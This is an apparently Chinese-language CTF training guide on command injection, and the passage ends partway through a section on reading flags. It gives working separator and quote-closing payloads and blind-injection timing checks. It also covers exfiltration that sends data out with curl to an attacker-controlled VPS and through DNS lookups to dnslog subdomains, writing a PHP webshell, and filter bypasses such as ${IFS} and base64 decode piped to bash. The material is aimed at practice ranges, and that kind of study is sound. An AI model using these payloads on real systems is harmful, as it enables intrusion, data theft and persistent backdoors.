## [g1] 命令注入——用户输入被拼进系统命令，用分隔符注入并执行任意命令
### [cmdi-basic] 命令注入检测与分隔符全集 | easy | 命令注入;RCE | command injection;cmdi
> 识别命令拼接点，用分隔符全集注入

#### 这个条目的作用
命令注入（Command Injection）是最容易拿 RCE 的漏洞之一：网站把用户输入直接拼进系统命令（ping、ls、tar、find 等），你用几个特殊字符就能让系统执行**你自己的**命令。本条目教你两件事：① 怎么从一堆功能里认出「这是个命令拼接点」；② 确认之后，用哪几个分隔符能稳定执行你的命令（分隔符全集）。

#### 前置条件
- 准备一个靶场（DVWA 的 Command Injection、pikachu 的 exec 模块、或任意本地练习环境），知道输入框对应的 URL 参数名（如 `ip`、`host`、`dir`）。
- 工具：浏览器开发者工具（F12，看请求和响应）就够；抓包用 Burp Suite（Repeater 方便改 payload 重发）。会用 `curl` 也行。
- 心法：先想清楚「**这段输入最后拼成了什么命令**」，再决定注入什么。拼进 `ping 8.8.8.8` 和拼进 `echo "hello"` 的注入写法不一样。

#### 第 1 步：认出命令拼接点（读源码 / 黑盒猜特征）
最可靠是拿到源码，看到类似这样的代码就是铁证：
```php
// PHP：把 $_GET['ip'] 直接拼进 system()，典型的命令注入入口
$ip = $_GET['ip'];
system('ping -c 1 ' . $ip);
```
```python
# Python：os.system / subprocess 带 shell=True 同样危险
import os
host = request.args.get('host')
os.system(f'ping -c 1 {host}')
```
黑盒场景下，凡是**输入 IP/域名/文件名/主机名，返回「ping 结果 / 执行输出」**的功能（网络连通性测试、端口扫描、打包下载、批量操作），大概率就是命令拼接点。先在输入框随便填个正常值（如 `8.8.8.8`）看回显，确认参数生效、回显里出现 ping 之类的输出。

#### 第 2 步：无害探测——先确认「我确实能执行命令」
不要一上来就 `; rm -rf /`（你连注入点都没确认，还可能打错靶机）。先注入一条**无害标识命令**：
```bash
# 在 ip 参数里输入（手动输入或 URL 编码后放地址栏）
8.8.8.8; echo CMDI_OK
# 对应 URL（分号在 URL 里最好编码为 %3B）
http://target/ping.php?ip=8.8.8.8%3B%20echo%20CMDI_OK
```
**预期结果**：响应里出现 `CMDI_OK`（不一定是最后一行，找一下）。出现 = 命令执行成功，注入点实锤。**如果不行**：换分隔符重试（见第 3 步）——`;` 可能被过滤，也可能这个环境里 `;` 不是分割符（比如 Windows）。

> [!tip] 探测命令的字符务必全是「安全」的：echo + 大写字母 + 下划线就够，别用可能被目标机器过滤或报警的关键词（whoami、cat、/etc/passwd 留给确认之后）。

#### 第 3 步：分隔符全集——一条条试，确定哪个能用
确认执行点后，开始测哪个分隔符在你的环境有效。分隔符全集就是下面这张表，从上到下按「最稳 → 条件性」排列：
| Payload | 效果 | 说明 |
|---|---|---|
| `; id` | 分号分隔，新命令无条件执行 | 最稳，Linux 通用，先试它 |
| `| id` | 管道，前命令的输出作为后命令输入 | 也稳；注意 `id` 的结果会跟着管道输出走，回显可能乱 |
| `|| id` | 前一条命令**失败**才执行 | 依赖前命令退出码，`ping` 一个不存在 IP 时好用 |
| `&& id` | 前一条命令**成功**才执行 | 前命令必须成功（ping 通）才轮到你的命令 |
| `` `id` `` | 反引号命令替换，结果替换进原命令 | payload 里外两层符号别漏 |
| `$(id)` | 命令替换，可嵌套 | 现代写法，比反引号更不易被拦截 |
| `%0aid` | URL 编码的换行符，解码后是第二行命令 | shell 会把换行当命令分隔 |

验证方法统一为：在参数里输入 `8.8.8.8; id`，**预期结果**：响应里出现 `uid=... gid=...` 之类的用户信息，说明 `id` 被执行。逐个试，记下**哪个能用**——后面的绕过章节都基于「至少有一个分隔符能通」。

> [!tip] 判不清回显顺序就用 `;` 或 `|`；`||`、`&&` 依赖前命令退出码，第一次测不出不代表没注入，换分隔符再试。

#### 第 4 步：URL 情境下的编码细节（GET 参数 / Burp）
在 URL 里，`;`、`&`、`|`、空格都有特殊含义，最好先 URL 编码再发，避免被浏览器或服务器解析吃掉：`;` → `%3B`，空格 → `%20`（或不用空格），`&` → `%26`。用 Burp Repeater 发请求时直接贴原始 payload 即可（Burp 自动处理编码差异），手敲地址栏/curl 时才要编码：
```bash
# curl 用 --data-urlencode 或自己转义，避免 shell 把你 payload 里的符号吃掉
curl -G 'http://target/ping.php' --data-urlencode 'ip=8.8.8.8; id'
```
**如果不行**：回显里出现 400 或语法错误，多半是符号没正确编码或被 WAF 拦了，先恢复简单 payload `8.8.8.8; echo 1` 排查。

#### 第 5 步：确认后的标准动作
注入点确认、分隔符选定后：① 先 `; id` 看当前用户（root 的话后面打得更顺）；② 再按 [cmdi-readflag] 的命令顺序读 flag；③ 权限允许再想反弹 shell 或写 webshell（见 [cmdi-blind] 的写文件小节）。永远先无害探测 → 再读取 → 最后才是破坏性动作。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `; id` 无任何回显，也没报错 | 分隔符被替换为空 / 被转义，或该环境不用 `;` 分隔 | 试 `\|`、`&&`、`\`\`id\`\``、`$(id)`、`%0a`，逐个换 |
| 回显乱序，`id` 输出混在 ping 结果里 | `\|` 管道让输出串行混排 | 换 `;` 或加 `echo ---SPLIT---` 作标记定位 |
| 地址栏手输 payload 后 400 | 符号被 URL 或浏览器解析 | 用 Burp Repeater / curl --data-urlencode |
| 关键词被拦截（echo、id 都没了） | 有黑名单过滤 | 进入 [cmdi-bypass-char] 做 base64/拼接绕过 |
| Windows 目标上 `;` 不生效 | Windows cmd 用 `&`/`\|` 分隔 | 换 `8.8.8.8 & whoami`（& 无条件执行） |

#### 实战要点
- 先无害 echo 确认执行点，再上读取类 payload；这是顺序，也是纪律。
- 分隔符优先级：`;` > `|` > `$( )`，三者覆盖 95% 场景；`||`/`&&` 只在前命令退出码可控时用。
- 命令之间留不留空格都可能影响过滤判定，被滤空格进 [cmdi-bypass-space]。
- 记录「哪个分隔符通、哪个被滤」，后面组合绕过时这是你的已知条件。
- 读 flag 前先 `id` 确认用户身份，root 与非 root 的读取路径不同（[cmdi-readflag]）。

### [cmdi-close] 引号闭合与执行点确认 | easy | 命令注入;闭合绕过 | quote bypass
> 注入点带引号时闭合补全，先确认执行点再读取

#### 这个条目的作用
很多拼接代码会把用户输入**包在引号里**再拼进命令（例如 `bash -c "ping $ip"` 或 `system("ping -c 1 \"$ip\"")`）。这时你直接发 `; id` 只会被当成**引号里的字面量**，不执行。本条目教你把引号「关掉」再注入（闭合绕过），以及注入前怎么用无害命令确认执行点。

#### 前置条件
- 已定位命令拼接点（请先看 [cmdi-basic] 第 1 步），但直接注入 `; id` 没反应——这通常是引号包裹或闭合顺序问题。
- 掌握一个概念：shell 里 `"..."` 和 `'...'` 括起来的内容会被当成一个参数/字符串，你要做的是**提前闭合引号**，让后面的 `;`/空格变成真正的命令分隔符。
- 场景对照：源码是 `system('ping -c 1 "' . $ip . '"')` 时，拼出来是 `ping -c 1 "你的输入"`，引号是 shell 的引号，不是你看到的 PHP 单引号。

#### 第 1 步：判断有没有引号包裹（盲猜技巧）
输入一个带**引号本身**的测试值，观察差异：
```bash
# 先发普通值
8.8.8.8
# 再发一个带双引号的值
8.8.8.8"
```
**预期结果**：如果源码有引号包裹，第二个请求通常会报语法错/回显明显不同（shell 引号没闭合）。**如果不行**：两个请求回显完全相同，说明没有引号层，直接回到 [cmdi-basic] 用 `; id` 就行，本条目跳过。

#### 第 2 步：双引号闭合——「关掉引号，执行命令，再补回去」
假设拼出的是 `ping -c 1 "这里"`，payload 用**闭合 + 注入 + 补全**三段式：
```bash
# 双引号场景：先 " 闭合，; id 执行，再 " 补全尾部引号
8.8.8.8"; id; "
# 拼合后的实际命令（shell 视角）：
# ping -c 1 "8.8.8.8"; id; ""
```
**预期结果**：响应出现 `uid=... gid=...`，且不再报引号错误。**如果不行**：可能尾部不是引号而是别的内容（见第 4 步注释法），或源码用的是单引号（见第 3 步）。

#### 第 3 步：单引号闭合与注释截断法
源码若用单引号包裹（`ping -c 1 '这里'`），对称地发：
```bash
8.8.8.8'; id; '
```
更省事的变体是**注释掉尾部**——用 `#` 把后面没用的部分全部吞掉，不用费心补回引号：
```bash
# 双引号尾部：# 之后的 " 会被注释忽略
8.8.8.8"; id; #
# 单引号尾部：同理
8.8.8.8'; id; #
# 拼合后：ping -c 1 "8.8.8.8"; id; #"
```
**预期结果**：`id` 正常执行。**如果不行**：`#` 在部分场景会被 URL 编码吃掉（要发 `%23`），或后端用了 `escapeshellcmd` 一类的转义函数——转义函数会把 `;`、引号前加反斜杠，此时换思路：注入**不带特殊符号**就能利用的点（如文件写入路径），或直接转 [cmdi-bypass-char] 做编码构造。

> [!warn] `#` 注释只对 shell 生效，且要保证 `#` 前面是真正的命令边界；如果尾部命令还有别的引号结构，先 `; id; #` 这种「注释在中」的写法测试。

#### 第 4 步：先确认执行点，再上读取 payload（关键纪律）
闭合成功后，**先注入无害命令确认执行点**，再读 flag。三种确认手段按需选：
```bash
; echo MARKER;        # 回显里出现 MARKER 即成功（最直观）
; sleep 5;            # 响应卡 5 秒 = 命令真的执行了（无回显时用）
; id > /tmp/out;      # 把输出写进文件，之后用别的漏洞（如文件包含）读它
```
**预期结果**：`MARKER` 出现 / 页面延迟 / `/tmp/out` 有内容。**如果不行**：命令没执行，回头检查闭合是否真的生效（第 2/3 步的拼合结果在脑子里过一遍）。

> [!warn] 先注入无害 echo 确认执行点，再上读取类 payload。直接上 `cat /flag` 出错时，你分不清是「闭合没成功」还是「路径不对」，排查成本翻倍。

#### 第 5 步：闭合后直接读 flag
执行点确认后按 [cmdi-readflag] 的顺序读：
```bash
8.8.8.8"; cat /flag; #
8.8.8.8"; cat /flag.txt; #
```
**预期结果**：flag 输出。**如果不行**：路径不对看 [cmdi-readflag] 的 `find / -name '*flag*'`；被过滤看 [cmdi-bypass-space] / [cmdi-bypass-char]。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 闭合后 `; id` 仍原样显示 | 引号没真正关闭（少了一个 `"`）或位置不对 | 把拼合后的命令在纸上写一遍：`ping -c 1 "8.8.8.8"; id; ""` |
| `#` 后面的东西还在报错 | `#` 被 URL 编码成 `%23` 后做参数时丢了 | 手动发 `%23`；或改用「补回引号」写法 |
| 单引号场景用双引号闭合失败 | 引号种类用反了 | 先确定是 `"` 还是 `'` 包裹（第 1 步辨别），再选对应 payload |
| ID/命令全部被加反斜杠转义 | 后端 `escapeshellcmd` / `escapeshellarg` | 转义函数下闭合无效，换编码绕过或换入口 |
| 无回显、但 `sleep 5` 有延迟 | 闭合成功只是没回显 | 按盲注处理：[cmdi-blind] 外带/写文件取数据 |

#### 实战要点
- 记住三段式：**闭合引号 + 注入命令 + 补回/注释尾部**，缺一不可。
- 先分辨引号种类（`"` or `'`），双引号场景里 `$`、反引号是活字符，单引号里全是死字符——利用姿势不同。
- `#` 注释法最省事，但要处理 URL 编码（`%23`）。
- 确认执行点（echo/sleep/写文件）必须先于读取操作（cat flag）。
- 遇到 `escapeshellarg` 等转义函数别硬刚，这层保护通常意味着要换注入面（如文件路径参数）或换漏洞类型。

### [cmdi-blind] 无回显盲判与外带写文件 | medium | 命令注入;盲注;外带 | blind cmdi
> 无回显环境用延迟判定注入点，外带或写文件取数据

#### 这个条目的作用
有些命令注入点**不返回任何命令输出**（回显被吞、输出被重定向到 /dev/null、或响应固定）。这种「盲」注入不是没法利用，而是要换三种手段：① 延时盲判（sleep）确认注入点；② 把数据传输出来（外带 exfil）；③ 把东西写进文件（写 webshell / 写临时文件）。本条目覆盖完整的盲打流程。

#### 前置条件
- 已确认（或高度怀疑）命令拼接点存在，但注入后无回显、页面响应固定。
- 需要一个**你完全可控**的接收端：自己的 VPS（有公网 IP，能起 HTTP 服务 / 能监听）、或 dnslog 平台（如 dnslog.cn，提供一个子域名给你做 DNS 外带）。
- 心法：盲注入三问——「怎么证明能执行」「怎么把数据拿出来」「拿不出来就写文件，写不进就把效果做出来（延时）」。

#### 第 1 步：时间盲判——延迟证明「命令在执行」
无回显时，最可靠的确认方式是把「命令执行」翻译成「响应时间变长」：
```bash
; sleep 5
| ping -c 5 127.0.0.1      # 约耗时 5 秒（Linux ping 每个包间隔约 1s）
$(sleep 5)
```
**预期结果**：注入 `; sleep 1` 时响应 ~1 秒，注入 `; sleep 5` 时响应 ~5 秒，对照组（不注入 / 注入无害字符）秒回——差值可复现就是注入点实锤。**如果不行**：先试不同分隔符（`|`、`&&`、`%0a`），sleep 一定要配上能用的分隔符；再不行检查是否被 `sleep` 关键词过滤（换 `$(sleep 5)` 或 `ping -c 5` 代替）。

> [!tip] 时间盲判要「对照 + 等差」：sleep 1 / sleep 3 / sleep 5 各测一次看响应时间是否成比例变化。只看一次 5 秒可能是网络抖动。

#### 第 2 步：HTTP 外带——把数据 curl 到你的服务器
确认能执行后，把目标数据发到你的监听端。最简：VPS 上 `nc -lvnp 8080` 或 `python3 -m http.server` 监听，靶机上：
```bash
; curl http://你的VPS:8080/$(whoami)
; curl http://你的VPS:8080/$(cat /flag)
```
**预期结果**：VPS 收到 `GET /root` 之类带 `whoami` 结果的请求。**如果不行**：① 靶机没 curl——换 `wget`、`python`、`/dev/tcp`；② 命令替换 `$()` 被滤——试 `` `whoami` `` 或先把数据写到变量再带出；③ 外网不通——见第 3 步 DNS 外带，或第 4 步写文件。

> [!warn] 外带 flag 前务必**先 base64**：flag 里的花括号 `{}`、空格 `_` 等字符会破坏 URL 结构、被服务器截断或丢进错误路径：
```bash
; curl http://你的VPS:8080/$(cat /flag | base64 -w0)
# base64 -w0 不可用时（busybox/macOS）：
; curl http://你的VPS:8080/$(cat /flag | base64 | tr -d '\n')
```

#### 第 3 步：DNS 外带——curl 不可用 / HTTP 出网被禁时
DNS 查询往往比 HTTP 更少被过滤。用 dnslog 平台申请子域名 `xxxx.dnslog.cn`，然后把数据拼成子域发 DNS 解析：
```bash
; ping -c 1 $(whoami).xxxx.dnslog.cn
; ping -c 1 $(cat /flag | base64 -w0 | tr -d '\n').xxxx.dnslog.cn
```
**预期结果**：dnslog 平台出现形如 `root.xxxx.dnslog.cn` 的解析记录，前缀就是数据（base64 状态）。**如果不行**：内网 DNS 不向外解析，或域名长度超限（DNS 单标签 ≤ 63 字节，把 base64 分段：`base64 -w0 | cut -c1-40` 分段发）。

> [!danger] 外带目标必须是自己可控的服务器或 dnslog，别往公网未知主机发数据——flag 等于白送，还可能惹上麻烦。

#### 第 4 步：写文件——出不了网就把东西落到磁盘
外带不通时，把 payload 效果写成文件，再用别的漏洞（任意文件读、文件包含 LFI、静态目录直接访问）拿内容：
```bash
; id > /tmp/out.txt            # 把命令输出写进可读文件
; echo '<?php system($_GET[c]);?>' > /var/www/html/s.php   # 写 PHP webshell
```
**预期结果**：`/tmp/out.txt` 产生且能读出来；`s.php` 能被 HTTP 访问，访问 `http://target/s.php?c=id` 显示 id 结果。**如果不行**：目录不可写 → 换 `/tmp`、`/dev/shm`（内存盘通常可写）、`/var/tmp` 试；不知道 web 根目录 → 先 `; ls -la /var/www/html/` 确认。

> [!danger] `> /var/www/html/s.php` 依赖目录可写和对根路径的猜测；写 webshell 前先 `ls` 确认目录存在，别盲写。写入后立刻想办法访问验证，别留后门不管。

#### 第 5 步：组合使用——盲打的完整套路
推荐顺序：`sleep` 确认执行点 → `id > /tmp/x` 确认可写 → 尝试 curl/wget 外带 → 失败则 DNS 外带 → 再失败则写文件走其他漏洞读取。每失败一层都要**记录失败原因**（没 curl？出网被禁？目录只读？），它们是下一步选型的输入。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 外带请求未到达 VPS | VPS 防火墙/端口没开，或靶机无 curl | 换 wget/python；确认 VPS 监听与实际端口一致 |
| 外带 URL 里 flag 花括号丢失 | 未 base64，`{}`/空格破坏了路径 | 一律 `cat /flag \| base64 -w0` 再外带 |
| 响应全部秒回，sleep 无效 | 分隔符被滤 / sleep 被替换 | 换 `$(sleep 5)`、`ping -c 5`，或看 [cmdi-bypass-char] |
| DNS 平台无记录 | 内网 DNS 受限或子域过长 | 分段外带；fallback 写文件 |
| webshell 写不进 /var/www/html | 目录只读或猜错路径 | `ls` 确认真实根目录；先写 `/tmp` 验证可写 |
| 数据有特殊字符被截断 | URL/DNS 对 `#`、`?`、空格敏感 | base64 后再传输，接收端解码 |

#### 实战要点
- 时间盲判必须有对照组和等差序列，单次延迟不作数。
- 出网数据一律 base64，统一用 `-w0`（无换行）或 `tr -d '\n'` 处理。
- 三层出网方案按可用性排序：HTTP（最直白）→ DNS（最隐蔽）→ 写文件（最后兜底）。
- 盲打每步留证据：延时数值、VPS 收到的请求、写入文件的 ls 结果——后续报告和复现都要用。
- 写 webshell 是拿权限的手段，写 /tmp 是拿数据的兜底，两者目的不同，别混用浪费请求。

## [g2] 命令注入绕过——过滤空格与关键词时的高频绕过，WAF/黑名单通用
### [cmdi-bypass-space] 空格与命令名替换绕过 | easy | 命令注入;绕过;WAF | IFS bypass
> 空格被滤用 ${IFS}/Tab/重定向/花括号，命令被滤用等价命令

#### 这个条目的作用
靶机和 WAF 最常做的一件事就是**过滤空格**：`ping 8.8.8.8; cat /flag` 里的空格一被删就变成 `cat/flag`，直接报错。本条目给你 6 种「空格替代品」和一组「命令名替代品」（tac/head/strings），其中至少两三种能绕过绝大多数简单黑名单。

#### 前置条件
- 已用 [cmdi-basic] 确认注入点、选定了能用的分隔符（比如 `;`）。
- 已观察到**空格被过滤**的迹象：带空格的 payload 无输出或报错，去掉空格后（如 `;/flag`）行为不同。
- Shell 常识：目标通常是 Linux 的 bash/sh/dash；Windows 的目标这里不适用（Windows 下空格很难替代，一般直接换思路）。

#### 第 1 步：${IFS}——最通用的空格替代（首选）
`IFS`（Internal Field Separator）是 shell 用来切词的分隔符变量，默认就是空格、Tab、换行。`${IFS}` 展开后就是空格：
```bash
; cat${IFS}/flag
; id${IFS};              # 命令间有空格的地方全用 ${IFS} 顶替
```
**预期结果**：命令正常执行，效果等同 `cat /flag`。**如果不行**：`IFS` 被关键字过滤（少见），bash 场景换 `${IFS$9}`——`$9` 是空位置参数，`${IFS$9}` 展开结果仍是 IFS，绕正则更稳：
```bash
; cat${IFS$9}/flag
```

> [!warn] `${IFS}` 在 sh/dash 环境也有效；但注意 `${IFS}` 不能放在命令**开头**当第一个单词的第一个字符用（部分 shell 会把它当前导空白吞掉），需要时先接个 `a${IFS}` 之类的占位。

#### 第 2 步：Tab 替代——%09 / 真实 Tab
Tab 在 URL 里编码为 `%09`，解码后 shell 同样按空白处理：
```bash
# URL 参数里直接写 %09（Burp 里可原样发送）
8.8.8.8;cat%09/flag
# 命令行构造时用真实 Tab 键也可以
8.8.8.8;cat<TAB>/flag
```
**预期结果**：等同 `cat /flag`。**如果不行**：部分黑名单把 `Tab` 也算空格一起滤，进入下一步换重定向。

#### 第 3 步：输入重定向——`<` 免掉空格（最优雅）
`cat </flag` 不需要任何空格：`<` 重定向让命令从文件读：
```bash
; cat</flag
; cat</flag|bash          # 组合：读取执行双省空格
```
**预期结果**：与 `cat /flag` 同效。这是「命令 + `<` + 路径」的结构，全程零空格。**如果不行**：`<` 被滤（少见），换花括号。

#### 第 4 步：花括号展开——{cat,/flag}
bash 特有的花括号展开：`{a,b}` 会展开成 `a b`，`{cat,/flag}` 就展开成带空格的 `cat /flag`：
```bash
; {cat,/flag}
; {cat,${IFS}/flag}        # 混合方案，双保险
```
**预期结果**：等同 `cat /flag`。**如果不行**：目标 shell 是 sh/dash（非 bash）时花括号展开不生效——这正是 [cmdi-bypass-space] 卖点里提示的坑，换回 `${IFS}` 或重定向。

#### 第 5 步：命令名也构建不了时——变量拼接
如果连**命令名本身**都被过滤（比如滤 `cat`），把命令名拆成变量拼起来：
```bash
; x=ca;y=t;$x$y /flag      # $x$y 拼出 cat
; a=c;a+=at;${a} /flag     # bash 追加写法（a+=at → cat）
```
**预期结果**：等同 `cat /flag`。**如果不行**：分段过多、黑名单有长度/拼接检测，直接进 [cmdi-bypass-char] 用 base64 解码执行。

#### 第 6 步：命令名替换——被滤的命令换等价命令
**只滤 `cat`** 时不用绕，换条同功能命令就行：
```bash
tac /flag                 # 倒序输出，flag 内容完整（最常用替换）
head -1 /flag             # 取第一行
strings /flag             # 提取可打印字符串
less / more / nl / od -c /flag
```
**预期结果**：flag 内容出现在输出里（tac 是倒序但内容不变）。**如果不行**：这些命令也被滤，回到第 5 步或 [cmdi-bypass-char]。

> [!warn] 花括号展开依赖 bash；目标 sh/dash 时换 ${IFS} 或输入重定向。拿不准目标 shell 就先 `; echo $0` 探测。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `${IFS}` 放命令开头失效 | shell 把开头空白吞掉 | 前面接字母：`a${IFS}cat${IFS}/flag` 或命令后置 |
| `{cat,/flag}` 报 bad substitution | 目标不是 bash（sh/dash） | 换 `${IFS}` 或 `cat</flag` |
| 只滤了 `cat`，其它没滤 | 黑名单白名单混用 | 用 tac/head/strings/less 顶替 |
| 空格没了但回显也没有 | 空格、Tab、IFS 全被滤 | 用 `<` 重定向（零空白结构） |
| 变量拼接后的命令报 not found | 分段拼出来的命令名不对 | 先 `; x=ca;y=t;echo $x$y` 验证拼接结果 |

#### 实战要点
- 空格替代的推荐顺序：`${IFS}` → Tab(`%09`) → `<` 重定向 → `{}` 展开，按黑名单强度依次升级。
- 命令替代的推荐顺序：`tac` → `head -1` → `strings`，三者覆盖常见 flag 形态。
- bash 与 sh/dash 差异是绕不过的環境项：先 `echo $0` 认清目标 shell 再选方案。
- 组合技常见套路：`cat</flag`（空格）＋ `tac /flag`（命令名）＋ `${IFS}`（变量）按需叠加。
- 每换一种绕过就重测 `; id` 一次，别拿 `cat /flag` 试错——id 简单好排查。

### [cmdi-bypass-char] base64 解码与编码构造绕过 | medium | 命令注入;绕过;base64 | filter bypass
> 命令名/空格/斜杠全滤时用 base64 解码执行与转义字符构造

#### 这个条目的作用
当黑名单凶到「**命令名、空格、斜杠全滤**」（白名单式正则，比如只放行字母数字）时，前面的 `/flag`、`cat` 全都会被删。终极手段是两条路：① **加密传输、解密执行**——把命令 base64 编码后发过去，让目标机器自己解出来再执行（`echo ... | base64 -d | bash`）；② **纯字符构造**——用转义、ANSI-C 引号、printf 八进制在运行时把命令拼出来。本条目两路都给全。

#### 前置条件
- 注入点可用（[cmdi-basic]），但逐字符过滤严重：空格被滤、`cat` 被滤、`/` 被滤，前面所有绕过都失效。
- 确认目标有 `base64`（Linux 标配）或 `printf`（几乎所有 shell 内置）；先 `; echo a | base64` 自检（如果这都能通，说明没滤 `|` 和 `base64`，直接走第 1 步）。
- 掌握 base64 工具：`echo 明文 | base64` 编码，`echo 密文 | base64 -d` 解码。编码后的字符串通常只含字母、数字、`+/=`，几乎不踩字符黑名单。

#### 第 1 步：base64 解码执行——最通用的全滤解药
把整条命令 base64 编码后传过去，目标用 `base64 -d` 解出原文再用 `bash` 执行：
```bash
# 先生成编码：本机执行
echo 'cat /flag' | base64
# 输出：Y2F0IC9mbGFn   （这就是 /flag 的 base64）
```
```bash
# 靶机注入 payload（参数里输入）：
; echo Y2F0IC9mbGFn | base64 -d | bash
; echo 'Y2F0IC9mbGFn' | base64 -d | sh
```
**预期结果**：等同执行 `cat /flag`，flag 输出。**如果不行**：`bash` 被滤换 `sh`；`echo` 被滤换 `printf` 输出；`|` 被滤换 `$(echo ...|base64 -d)` 命令替换。

> [!tip] 这是「命令名、空格、斜杠全被滤」时的首选。编码串里没有 `/`（可能有个 `+` 或 `=`），黑名单正则很难拦；唯一要求是目标装 base64 且有 bash/sh。

#### 第 2 步：自造命令名编码表（常用命令随时查）
自己先算好网格，打法时直接抄：
```bash
echo 'cat /flag' | base64        # Y2F0IC9mbGFn
echo 'cat /flag.txt' | base64    # Y2F0IC9mbGFnLnR4dA== （注意 == 结尾）
echo 'id' | base64               # aWQ=
echo 'ls /' | base64             # bHMgLw==
```
**预期结果**：得到可复制进 payload 的编码串。**如果不行**：`==`（base64 padding）可能被过滤（少见），去掉 padding 仍可解码（`echo Y2F0IC9mbGFnLnR4dA | base64 -d`），或换第 3 步的字符构造。

#### 第 3 步：反斜杠与引号构造——不依赖 base64 的纯字符方案
不需要编码工具，在 shell 层用「字符拼接」把被滤的命令名/路径拼出来：
```bash
cat /fla\g                # 反斜杠转义：\g 仍是字面 g，路径合成 /flag
c""at /fl\ag              # 空引号拼接：c""at → cat
c'a't /fl''ag             # 空单引号拼接：c'a't → cat
```
**预期结果**：黑名单如果只是 `str_replace('cat','')` 或正则不含转义处理，这些写法全部绕过；flag 输出。**如果不行**：黑名单是「解析后语义过滤」或多次递归过滤（`cat` 删干净），进入第 4 步。

#### 第 4 步：ANSI-C 引号——$'...' 十六进制构造
bash 的 `$'...'` 里 `\xHH` 是十六进制字节，动态生成命令名：
```bash
$'\x63\x61\x74' /flag             # \x63\x61\x74 → cat
$'\x63\x61\x74' $'\x2f\x66\x6c\x61\x67'   # 连路径也一起构造（/flag）
```
**预期结果**：等同 `cat /flag`。**如果不行**：目标不是 bash（sh 不支持 `$'...'`），换第 5 步 printf（POSIX 通用）。

#### 第 5 步：printf 八进制——sh 也认的纯构造
`printf` 的 `\NNN` 是八进制字节，且 sh/dash 都内置：
```bash
$(printf '\143\141\164') /flag    # 八进制：c=143 a=141 t=164
$(printf '\143\141\164') $(printf '\57\146\154\141\147')   # /flag 全构造
```
**预期结果**：等同 `cat /flag`。**如果不行**：`$()` 被滤，把 printf 放进反引号 `` `printf ...` ``；再不行组合变量：`c=$(printf '\143');t=$(printf '\164');$c${t//t/a}`（复杂场景才需要，多数不用到）。

> [!tip] `$'\x..'`、printf 八进制都是纯字符构造，源码里根本不存在 `cat` 这个字符串，黑名单正则（尤其只按字面匹配的）很难覆盖。

#### 第 6 步：多层组合实战示例
把前面全串起来对付「滤空格 + 滤 cat + 滤斜杠」的三重过滤：
```bash
# 空格 → ${IFS}（或 <），cat → $'\x63\x61\x74'，/ → 变量
; $'\x63\x61\x74'${IFS}$'\x2f\x66\x6c\x61\x67'
# base64 路：编码串里没有 / 和空格，只需处理可能的 + 和 =
; echo Y2F0IC9mbGFn|base64 -d|sh
```
**预期结果**：flag 输出，全程无 `cat`、无空格、无字面 `/`。**如果不行**：仍被拦说明过滤是语义级（真的解析命令再拦截），此时优先考虑换注入点/换漏洞类型，别无限加戏。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `echo ... base64 -d \| bash` 后无输出 | base64 串拼错 / padding 丢了 | 本机先 `echo 'cat /flag' \| base64 -d` 验证解码结果 |
| 报 `base64: invalid input` | 目标没 base64 或串里有杂字符 | 换 `printf`/`$'...'`/python 单行构造 |
| `$'\x63\x61\x74'` 报错 | 目标 sh 不支持 ANSI-C 引号 | 换 printf 八进制（POSIX 通用） |
| `cat /fla\g` 依然被拦 | 过滤是递归/多次 str_replace | 用 `$''`/printf 彻底不出现目标字符串 |
| base64 串含 `=` 被拦 | 黑名单滤 `=` | 去掉 padding（解码不强制要 `==`）；或换构造路 |
| shell 报 not found / bad substitution | 拼接产物不是合法命令名 | 先 `; echo $'\x63\x61\x74'` 单测构造结果 |

#### 实战要点
- base64 路（`echo 密文|base64 -d|bash`）是「全滤」场景第一选择，编码串几乎不踩字符黑名单。
- 字符构造按 shell 兼容性排序：`\` 转义（所有 shell）→ 空引号（所有 shell）→ `$'...'`（bash）→ printf（POSIX）。
- 每次构造先单独验证一步（`echo $'\x63\x61\x74'` 输出 cat），再接完整 payload，别一步到位盲打。
- `==`、`+`、`/` 三个字符是各类黑名单常客，编码串里出现就优先换方案。
- 若四种构造全部失效，说明过滤已到语义层，停止堆 payload，转向找别的入口（文件上传、SSRF）。

### [cmdi-readflag] 读 flag 路径与命令顺序 | easy | 命令注入;读取 | read flag
> 按稳定度优先尝试 flag 常见路径与环境变量

#### 这个条目的作用
注入点有了、命令能执行了，最后一步是「把 flag 拿到手」。但 flag 放在哪？`/flag` 还是 `/flag.txt`？docker 环境还是 root 目录？本条目给你一套**按命中率排序的命令序列**：优先试最高频路径，一个不行立刻换下一个，最后用 `find` 全盘扫、用环境变量兜底。目标是把「找 flag」从碰运气变成流水线。

#### 前置条件
- 已确认注入点可执行命令（[cmdi-basic] 或 [cmdi-close]），选定的分隔符可用。
- 有用 [cmdi-basic] 第 5 步跑过 `; id`——知道当前用户和 shell，root 时读取路径更自由。
- 心法：**顺序即效率**。常见靶机的 flag 就放在那 5 个固定位置之一，先打快枪，再开地图炮。

#### 第 1 步：高命中路径快试（顺序执行，一步一换）
按历史命中率从高到低，四条命令一次送完：
```bash
; cat /flag
; cat /flag.txt
; cat /root/flag
; cat /root/flag.txt
```
**预期结果**：其中一条输出 flag（形如 `flag{...}` 或 `ctf{...}`）。**如果不行**：都不命中，不要加戏，直接进第 2 步 find 全盘扫。

> [!tip] Docker 靶机 flag 常见于 `/flag`、`/flag.txt`、`/root/flag` 或环境变量（CTFd 注入）；先跑这 4 条的成本比 find 低一个数量级，永远优先。

#### 第 2 步：find 全盘扫（找不到固定路径时）
```bash
; find / -name '*flag*' 2>/dev/null
```
**预期结果**：输出所有名字含 flag 的文件路径，按结果 cat 对应路径。**如果不行**：`find` 被滤或没装（Alpine 也带 busybox find，一般有），用 `find / -iname '*flag*'`（忽略大小写）或 `/usr/bin/find` 绝对路径；再不行进第 3 步目录侦察。

#### 第 3 步：目录侦察（找「flag 藏在哪」的上下文）
```bash
; ls -la / /root /home /var/www 2>/dev/null
; ls -la /tmp /var/tmp /dev/shm 2>/dev/null   # 临时目录常藏题面/flag
```
**预期结果**：从目录列表里认出可疑文件（名字怪、权限 644、刚创建）。**如果不行**：目录列表里没概念，说明 flag 可能在环境变量或启动参数里，走第 4 步。

#### 第 4 步：环境变量与进程参数（CTFd/启动注入的 flag 常客）
